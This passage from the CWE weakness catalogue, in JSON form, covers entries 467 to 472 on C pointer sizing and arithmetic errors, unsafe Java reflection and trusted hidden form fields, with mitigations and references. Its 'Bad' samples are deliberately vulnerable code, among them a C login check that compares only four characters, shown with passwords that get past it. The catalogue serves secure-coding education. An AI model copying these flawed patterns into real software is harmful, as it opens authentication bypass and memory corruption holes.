        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use expressions such as \"sizeof(*pointer)\" instead of \"sizeof(pointer)\", unless you intend to run sizeof() on a pointer type to gain some platform independence or if you are allocating a variable on the stack."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Care should be taken to ensure sizeof returns the size of the data structure itself, and not the size of the pointer to the data structure."
            },
            {
              "BodyText": "In this example, sizeof(foo) returns the size of the pointer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tdouble *foo;\n\t...\n\tfoo = (double *)malloc(sizeof(foo));\n```"
            },
            {
              "BodyText": "In this example, sizeof(*foo) returns the size of the data structure and not the size of the pointer."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\tdouble *foo;\n\t...\n\tfoo = (double *)malloc(sizeof(*foo));\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded."
            },
            {
              "Nature": "Bad",
              "ExampleCode": "```\n```\n/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */* \n\t\n\tchar *username = \"admin\";\n\tchar *pass = \"password\";\n\t\n\tint AuthenticateUser(char *inUser, char *inPass) {\n\t```\n\t\t\tprintf(\"Sizeof username = %d\\n\", sizeof(username));\n\t\t\tprintf(\"Sizeof pass = %d\\n\", sizeof(pass));\n\t\t\tif (strncmp(username, inUser, sizeof(username))) {\n\t\t\t\tprintf(\"Auth failure of username using sizeof\\n\");\n\t\t\t\treturn(AUTH_FAIL);\n\t\t\t}\n```\n/* Because of CWE-467, the sizeof returns 4 on many platforms and architectures. */* \n\t\t\t\n\t\t\tif (! strncmp(pass, inPass, sizeof(pass))) {\n\t\t\t```\n\t\t\t\tprintf(\"Auth success of password using sizeof\\n\");\n\t\t\t\treturn(AUTH_SUCCESS);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprintf(\"Auth fail of password using sizeof\\n\");\n\t\t\t\treturn(AUTH_FAIL);\n\t\t\t}\n\t}\n\tint main (int argc, char **argv)\n\t{\n\t\t\tint authResult;\n\t\t\tif (argc < 3) {\n\t\t\t\tExitError(\"Usage: Provide a username and password\");\n\t\t\t}\n\t\t\tauthResult = AuthenticateUser(argv[1], argv[2]);\n\t\t\tif (authResult != AUTH_SUCCESS) {\n\t\t\t\tExitError(\"Authentication failed\");\n\t\t\t}\n\t\t\telse {\n\t\t\t\tDoAuthenticatedTask(argv[1]);\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "In AuthenticateUser(), because sizeof() is applied to a parameter with an array type, the sizeof() call might return 4 on many modern architectures. As a result, the strncmp() call only checks the first four characters of the input password, resulting in a partial comparison (CWE-187), leading to improper authentication (CWE-287)."
            },
            {
              "BodyText": "Because of the partial comparison, any of these passwords would still cause authentication to succeed for the \"admin\" user:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\tpass5\n\tpassABCDEFGH\n\tpassWORD\n```"
            },
            {
              "BodyText": "Because only 4 characters are checked, this significantly reduces the search space for an attacker, making brute force attacks more feasible."
            },
            {
              "BodyText": "The same problem also applies to the username, so values such as \"adminXYZ\" and \"administrator\" will succeed for the username."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Use of sizeof() on a pointer type"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ARR01-C",
          "EntryName": "Do not apply the sizeof operator to a pointer when taking the size of an array"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "MEM35-C",
          "EntryName": "Allocate sufficient memory for an object",
          "MappingFit": "CWE More Abstract"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP10",
          "EntryName": "Incorrect Buffer Length Computation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-442",
          "Authors": [
            "Robert Seacord"
          ],
          "Title": "EXP01-A. Do not take the sizeof a pointer to determine the size of a type",
          "URL": "https://www.securecoding.cert.org/confluence/display/seccode/EXP01-A.+Do+not+take+the+sizeof+a+pointer+to+determine+the+size+of+a+type"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "468",
      "Name": "Incorrect Pointer Scaling",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "In C and C++, one may often accidentally refer to the wrong memory due to the semantics of when math operations are implicitly scaled.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "682",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "Programmers may try to index from a pointer by adding a number of bytes. This is incorrect because C and C++ implicitly scale the operand by the size of the data type."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity"
          ],
          "Impact": [
            "Read Memory",
            "Modify Memory"
          ],
          "Note": "Incorrect pointer scaling will often result in buffer overflow conditions. Confidentiality can be compromised if the weakness is in the context of a buffer over-read or under-read."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use a platform with high-level memory abstractions."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Always use array indexing instead of direct pointer manipulation."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use technologies for preventing buffer overflows."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-55",
          "Entries": [
            {
              "IntroText": "This example attempts to calculate the position of the second byte of a pointer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint *p = x;\n\tchar * second_char = (char *)(p + 1);\n```"
            },
            {
              "BodyText": "In this example, second_char is intended to point to the second byte of p. But, adding 1 to p actually adds sizeof(int) to p, giving a result that is incorrect (3 bytes off on 32-bit platforms). If the resulting memory address is read, this could potentially be an information leak. If it is a write, it could be a security-critical write to unauthorized memory-- whether or not it is a buffer overflow. Note that the above code may also be wrong in other ways, particularly in a little endian environment."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Unintentional pointer scaling"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ARR39-C",
          "EntryName": "Do not add or subtract a scaled integer to a pointer",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP08-C",
          "EntryName": "Ensure pointer arithmetic is used correctly"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 6, \"Pointer Arithmetic\", Page 277",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "469",
      "Name": "Use of Pointer Subtraction to Determine Size",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product subtracts one pointer from another in order to determine size, but this calculation can be incorrect if the pointers do not exist in the same memory chunk.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "682",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control",
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Modify Memory",
            "Read Memory",
            "Execute Unauthorized Code or Commands",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "There is the potential for arbitrary code execution with privileges of the vulnerable program."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Save an index variable. This is the recommended solution. Rather than subtract pointers from one another, use an index variable of the same size as the pointers in question. Use this variable to \"walk\" from one pointer to the other and calculate the difference. Always validate this number."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following example contains the method size that is used to determine the number of nodes in a linked list. The method is passed a pointer to the head of the linked list."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tstruct node {\n\t\tint data;\n\t\tstruct node* next;\n\t};\n```\n// Returns the number of nodes in a linked list from* \n\t\n\t\n\t *// the given pointer to the head of the list.* \n\tint size(struct node* head) {\n\t```\n\t\tstruct node* current = head;\n\t\tstruct node* tail;\n\t\twhile (current != NULL) {\n\t\t\ttail = current;\n\t\t\tcurrent = current->next;\n\t\t}\n\t\treturn tail - head;\n\t}\n```\n// other methods for manipulating the list* \n\t..."
            },
            {
              "BodyText": "However, the method creates a pointer that points to the end of the list and uses pointer subtraction to determine the number of nodes in the list by subtracting the tail pointer from the head pointer. There no guarantee that the pointers exist in the same memory area, therefore using pointer subtraction in this way could return incorrect results and allow other unintended behavior. In this example a counter should be used to determine the number of nodes in the list, as shown in the following code."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t...\n\tint size(struct node* head) {\n\t\tstruct node* current = head;\n\t\tint count = 0;\n\t\twhile (current != NULL) {\n\t\t\tcount++;\n\t\t\tcurrent = current->next;\n\t\t}\n\t\treturn count;\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Improper pointer subtraction"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ARR36-C",
          "EntryName": "Do not subtract or compare two pointers that do not refer to the same array",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP7",
          "EntryName": "Faulty Pointer Use"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "470",
      "Name": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.",
      "ExtendedDescription": "If the product uses external inputs to determine which class to instantiate or which method to invoke, then an attacker could supply values to select unexpected classes or methods. If this occurs, then the attacker could create control flow paths that were not intended by the developer. These paths could bypass authentication or access control checks, or otherwise cause the product to behave in an unexpected manner. This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the product's classpath (CWE-427) or add new entries to the product's classpath (CWE-426). Under either of these conditions, the attacker can use reflection to introduce new, malicious behavior into the product.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "913",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "913",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "610",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "20",
          "ViewID": "700",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Class": "Interpreted",
          "Prevalence": "Sometimes"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Reflection Injection"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability",
            "Other"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Alter Execution Logic"
          ],
          "Note": "The attacker might be able to execute code that is not directly accessible to the attacker. Alternately, the attacker could call unexpected code in the wrong place or the wrong time, possibly modifying critical system state."
        },
        {
          "Scope": [
            "Availability",
            "Other"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart",
            "Other"
          ],
          "Note": "The attacker might be able to use reflection to call the wrong code, possibly with unexpected arguments that violate the API (CWE-227). This could cause the product to exit or hang."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "By causing the wrong code to be invoked, the attacker might be able to trigger a runtime error that leaks sensitive information in the error message, such as CWE-536."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Refactor your code to avoid using reflection."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not use user-controlled inputs to select and load classes or code."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Apply strict input validation by using allowlists or indirect selection to ensure that the user is only selecting allowable classes or code."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "A common reason that programmers use the reflection API is to implement their own command dispatcher. The following example shows a command dispatcher that does not use reflection:"
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tString ctl = request.getParameter(\"ctl\");\n\tWorker ao = null;\n\tif (ctl.equals(\"Add\")) {\n\t\tao = new AddCommand();\n\t}\n\telse if (ctl.equals(\"Modify\")) {\n\t\tao = new ModifyCommand();\n\t}\n\telse {\n\t\tthrow new UnknownActionError();\n\t}\n\tao.doAction(request);\n```"
            },
            {
              "BodyText": "A programmer might refactor this code to use reflection as follows:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString ctl = request.getParameter(\"ctl\");\n\tClass cmdClass = Class.forName(ctl + \"Command\");\n\tWorker ao = (Worker) cmdClass.newInstance();\n\tao.doAction(request);\n```"
            },
            {
              "BodyText": "The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the if/else blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher. However, the refactoring allows an attacker to instantiate any object that implements the Worker interface. If the command dispatcher is still responsible for access control, then whenever programmers create a new class that implements the Worker interface, they must remember to modify the dispatcher's access control code. If they do not modify the access control code, then some Worker classes will not have any access control."
            },
            {
              "BodyText": "One way to address this access control problem is to make the Worker object responsible for performing the access control check. An example of the re-refactored code follows:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString ctl = request.getParameter(\"ctl\");\n\tClass cmdClass = Class.forName(ctl + \"Command\");\n\tWorker ao = (Worker) cmdClass.newInstance();\n\tao.checkAccessControl(request);\n\tao.doAction(request);\n```"
            },
            {
              "BodyText": "Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes. This code also highlights another security problem with using reflection to build a command dispatcher. An attacker can invoke the default constructor for any kind of object. In fact, the attacker is not even constrained to objects that implement the Worker interface; the default constructor for any object in the system can be invoked. If the object does not implement the Worker interface, a ClassCastException will be thrown before the assignment to ao, but if the constructor performs operations that work in the attacker's favor, the damage will already have been done. Although this scenario is relatively benign in simple products, in larger products where complexity grows exponentially it is not unreasonable that an attacker could find a constructor to leverage as part of an attack."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2018-1000613",
          "Description": "Cryptography API uses unsafe reflection when deserializing a private key",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1000613"
        },
        {
          "Reference": "CVE-2004-2331",
          "Description": "Database system allows attackers to bypass sandbox restrictions by using the Reflection API.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2331"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Unsafe Reflection"
        },
        {
          "TaxonomyName": "The CERT Oracle Secure Coding Standard for Java (2011)",
          "EntryID": "SEC06-J",
          "EntryName": "Do not use reflection to increase accessibility of classes, methods, or fields"
        }
      ],
      "RelatedAttackPatterns": [
        "138"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "471",
      "Name": "Modification of Assumed-Immutable Data (MAID)",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly protect an assumed-immutable element from being modified by an attacker.",
      "ExtendedDescription": "This occurs when a particular input is critical enough to the functioning of the application that it should not be modifiable at all, but it is. Certain resources are often assumed to be immutable when they are not, such as hidden form fields in web applications, cookies, and reverse DNS lookups.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "664",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Architecture and Design"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "Common data types that are attacked are environment variables, web application parameters, and HTTP headers."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Unexpected State"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Operation",
            "Implementation"
          ],
          "Description": "When the data is stored or transmitted through untrusted sources that could modify the data, implement integrity checks to detect unauthorized modification, or store/transmit the data in a trusted location that is free from external influence."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the code excerpt below, an array returned by a Java method is modified despite the fact that arrays are mutable."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString[] colors = car.getAllPossibleColors();\n\tcolors[0] = \"Red\";\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2002-1757",
          "Description": "Relies on $PHP_SELF variable for authentication.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1757"
        },
        {
          "Reference": "CVE-2005-1905",
          "Description": "Gain privileges by modifying assumed-immutable code addresses that are accessed by a driver.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1905"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Modification of Assumed-Immutable Data"
        }
      ],
      "RelatedAttackPatterns": [
        "384",
        "385",
        "386",
        "387",
        "388"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "MAID issues can be primary to many other weaknesses, and they are a major factor in languages that provide easy access to internal program constructs, such as PHP's register_globals and similar features. However, MAID issues can also be resultant from weaknesses that modify internal state; for example, a program might validate some data and store it in memory, but a buffer overflow could overwrite that validated data, leading to a change in program logic."
        },
        {
          "Type": "Theoretical",
          "Note": "There are many examples where the MUTABILITY property is a major factor in a vulnerability."
        }
      ]
    },
    {
      "ID": "472",
      "Name": "External Control of Assumed-Immutable Web Parameter",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.",
      "ExtendedDescription": "\n\nIf a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input.\n\n\nFor example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "642",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "471",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Assumed-Immutable Parameter Tampering"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "Without appropriate protection mechanisms, the client can easily tamper with cookies and similar web data. Reliance on the cookies without detailed validation can lead to problems such as SQL injection. If you use cookie values for security related decisions on the server side, manipulating the cookies might lead to violations of security policies such as authentication bypassing, user impersonation and privilege escalation. In addition, storing sensitive data in the cookie without appropriate protection can also lead to disclosure of sensitive user data, especially data stored in persistent cookies."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-5",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n"
        },
        {
          "MitigationID": "MIT-20",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Input Validation",
          "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In this example, a web application uses the value of a hidden form field (accountID) without having done any input validation because it was assumed to be immutable."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString accountID = request.getParameter(\"accountID\");\n\tUser user = getUserFromID(Long.parseLong(accountID));\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Hidden fields should not be trusted as secure parameters."
            },
            {
              "BodyText": "An attacker can intercept and alter hidden fields in a post to the server as easily as user input fields. An attacker can simply parse the HTML for the substring:"
            },
            {
              "Nature": "Bad",
              "Language": "HTML",
              "ExampleCode": "```\n\t<input type=\"hidden\"\n```"
            },
            {
              "BodyText": "or even just \"hidden\". Hidden field values displayed later in the session, such as on the following page, can open a site up to cross-site scripting attacks."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2002-0108",
          "Description": "Forum product allows spoofed messages of other users via hidden form fields for name and e-mail address.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0108"
        },
        {
          "Reference": "CVE-2000-0253",
          "Description": "Shopping cart allows price modification via hidden form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0253"
        },
        {
          "Reference": "CVE-2000-0254",
          "Description": "Shopping cart allows price modification via hidden form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0254"
        },
        {
          "Reference": "CVE-2000-0926",
          "Description": "Shopping cart allows price modification via hidden form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0926"
        },
        {
          "Reference": "CVE-2000-0101",
          "Description": "Shopping cart allows price modification via hidden form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0101"
        },
        {
          "Reference": "CVE-2000-0102",
          "Description": "Shopping cart allows price modification via hidden form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0102"
        },
        {
          "Reference": "CVE-2000-0758",
          "Description": "Allows admin access by modifying value of form field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0758"
        },
        {
          "Reference": "CVE-2002-1880",
          "Description": "Read messages by modifying message ID parameter.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1880"
        },
        {
          "Reference": "CVE-2000-1234",
          "Description": "Send email to arbitrary users by modifying email parameter.",
